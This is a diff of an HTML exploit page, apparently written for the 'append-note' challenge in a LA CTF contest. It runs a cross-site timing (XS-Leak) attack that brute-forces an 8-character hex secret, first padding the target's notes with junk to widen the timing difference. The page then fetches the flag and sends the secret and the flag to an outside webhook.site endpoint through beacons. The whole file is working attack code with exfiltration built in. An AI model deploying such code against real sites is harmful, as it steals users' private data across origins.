@@ -1,119 +1,90 @@
 <!DOCTYPE html>
 <html>
-<head><title>XS-Leak</title></head>
+<head><title>XS-Leak Final</title></head>
 <body>
 <div id="s">Loading...</div>
 <script>
-var TARGET = "https://append-note-o1qq9.instancer.lac.tf";
-var WEBHOOK = "https://webhook.site/9f21f2f3-2a8e-4374-b6ea-76bbee2a866e";
+var TARGET = "https://append-note-7wwed.instancer.lac.tf";
+var WEBHOOK = "https://webhook.site/9aac3658-ff0f-45b5-b8ae-6f7d8d3c0eee";
 var CHARS = "0123456789abcdef";
 
-// Report function - multiple methods for reliability
 function report(msg) {
     navigator.sendBeacon(WEBHOOK, msg);
     new Image().src = WEBHOOK + "?m=" + encodeURIComponent(msg);
 }
 
-report("PAGE_LOAD");
+report("LOAD");
 
-// Create a popup for navigation (form target)
-function testChar(prefix, c) {
+// Navigate via form and measure time
+function navigate(content) {
     return new Promise(function(resolve) {
-        var url = TARGET + "/append?content=" + encodeURIComponent(prefix + c) + "&url=" + encodeURIComponent(TARGET + "/");
-        var wname = "w_" + Math.random().toString(36).slice(2);
+        var url = TARGET + "/append?content=" + encodeURIComponent(content) + "&url=" + encodeURIComponent(TARGET + "/");
+        var wname = "w" + Math.random().toString(36).slice(2);
         
-        // Create form
         var form = document.createElement("form");
         form.method = "GET";
         form.action = url;
         form.target = wname;
         document.body.appendChild(form);
         
-        var start = performance.now();
+        var t0 = performance.now();
         form.submit();
         document.body.removeChild(form);
         
-        // Wait for navigation to complete - use fixed delay
         setTimeout(function() {
-            var elapsed = performance.now() - start;
-            // Try to close the window
-            try {
-                var w = window.open("", wname);
-                if (w) w.close();
-            } catch(e) {}
-            resolve({ c: c, time: elapsed });
-        }, 400);
+            var elapsed = performance.now() - t0;
+            try { window.open("", wname).close(); } catch(e) {}
+            resolve(elapsed);
+        }, 200);
     });
-}
-
-async function brutePosition(prefix) {
-    var results = [];
-    // Test each char sequentially
-    for (var i = 0; i < CHARS.length; i++) {
-        var r = await testChar(prefix, CHARS[i]);
-        results.push(r);
-    }
-    // Sort by time - fastest first (200 might be faster due to startswith short-circuit?)
-    // Or slowest (200 might do more work?)
-    results.sort(function(a, b) { return a.time - b.time; });
-    return results;
 }
 
 async function main() {
     report("START");
-    document.getElementById("s").textContent = "Working...";
+    document.getElementById("s").textContent = "Polluting...";
     
     try {
-        // SECRET is just 8 hex chars, not lactf{SECRET}!
-        var prefix = "";
+        // Step 1: Pollute notes with garbage to amplify timing difference
+        // Use strings that won't match any hex prefix (start with Z)
+        for (var i = 0; i < 50; i++) {
+            await navigate("ZZZZ" + i);
+        }
+        report("POLLUTED");
+        
+        // Step 2: Now do timing attack - 200 will short-circuit on SECRET, 404 must check all 101 notes
         var secret = "";
         
         for (var pos = 0; pos < 8; pos++) {
-            document.getElementById("s").textContent = "Position " + pos;
-            var results = await brutePosition(prefix + secret);
+            document.getElementById("s").textContent = "P" + pos;
             
-            // Report all timings for this position
-            var allTimings = results.map(function(r) { return r.c + ":" + Math.round(r.time); }).join(",");
-            report("P" + pos + "=" + allTimings);
+            var results = [];
+            for (var i = 0; i < CHARS.length; i++) {
+                var c = CHARS[i];
+                var time = await navigate(secret + c);
+                results.push({ c: c, time: time });
+            }
             
-            // Take fastest as guess (might need adjustment)
-            var fastest = results[0];
-            var slowest = results[results.length - 1];
+            results.sort(function(a, b) { return a.time - b.time; });
             
-            // If difference is small, might need different logic
-            var diff = slowest.time - fastest.time;
-            report("P" + pos + "_DIFF=" + Math.round(diff) + "_FAST=" + fastest.c + "_SLOW=" + slowest.c);
+            var fast = results[0];
+            var slow = results[results.length - 1];
             
-            // Try fastest first
-            secret += fastest.c;
+            report("P" + pos + ":F=" + fast.c + "(" + Math.round(fast.time) + ")S=" + slow.c + "(" + Math.round(slow.time) + ")");
+            
+            // Correct char should be FASTEST (200 short-circuits on first note = SECRET)
+            secret += fast.c;
         }
         
-        report("SECRET_FAST=" + secret);
+        report("SECRET=" + secret);
         
-        // Try to get flag with fast secret
         var resp = await fetch(TARGET + "/flag?secret=" + secret);
         var flag = await resp.text();
-        report("FLAG_FAST=" + flag);
+        report("FLAG=" + flag);
         
-        // If that didn't work, maybe we need slowest
-        // Rebuild with slowest
-        secret = "";
-        prefix = "";
-        for (var pos = 0; pos < 8; pos++) {
-            var results = await brutePosition(prefix + secret);
-            results.sort(function(a, b) { return b.time - a.time; }); // Slowest first
-            secret += results[0].c;
-        }
-        
-        report("SECRET_SLOW=" + secret);
-        var resp2 = await fetch(TARGET + "/flag?secret=" + secret);
-        var flag2 = await resp2.text();
-        report("FLAG_SLOW=" + flag2);
-        
-        document.getElementById("s").textContent = "Done! Check webhook.";
+        document.getElementById("s").textContent = flag;
         
     } catch(e) {
-        report("ERROR=" + e.message);
+        report("ERR=" + e.message);
     }
 }
 
